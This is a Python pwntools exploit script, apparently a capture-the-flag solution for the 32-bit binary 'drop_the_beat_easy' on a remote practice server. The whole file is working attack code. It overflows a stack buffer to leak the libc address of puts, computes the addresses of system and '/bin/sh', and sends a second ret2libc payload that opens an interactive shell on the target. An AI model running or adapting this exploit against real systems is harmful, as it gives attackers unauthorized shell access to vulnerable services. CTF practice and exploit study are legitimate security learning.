#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./drop_the_beat_easy')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elif debug == 0:
    p = remote('prob.vulnerable.kr', 20002)
    libc = ELF('./libc.so.6', checksec=False)
elf = ELF('./drop_the_beat_easy', checksec=False)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
addr_main = 0x0804853B

pd = 'a' * 0x68
pd += p32(plt_puts)
pd += p32(addr_main)
pd += p32(got_puts)
p.sendlineafter('2) No Beat For You..!\n', '1')
p.sendlineafter('Give Me a Beat!!\n', pd)
p.recvuntil("AWESOME!\n")

addr_puts = u32(p.recv(4))
success('addr_puts = ' + hex(addr_puts))
libcbase = addr_puts - libc.sym['puts']
addr_system = libcbase + libc.sym['system']
addr_bin_sh = libcbase + libc.search('/bin/sh').next()

# gdb.attach(p, "b *0x08048672\nc")
pd = 'a' * 0x68
pd += p32(addr_system)
pd += p32(addr_main)
pd += p32(addr_bin_sh)
p.sendlineafter('2) No Beat For You..!\n', '1')
p.sendlineafter('Give Me a Beat!!\n', pd)
p.interactive()
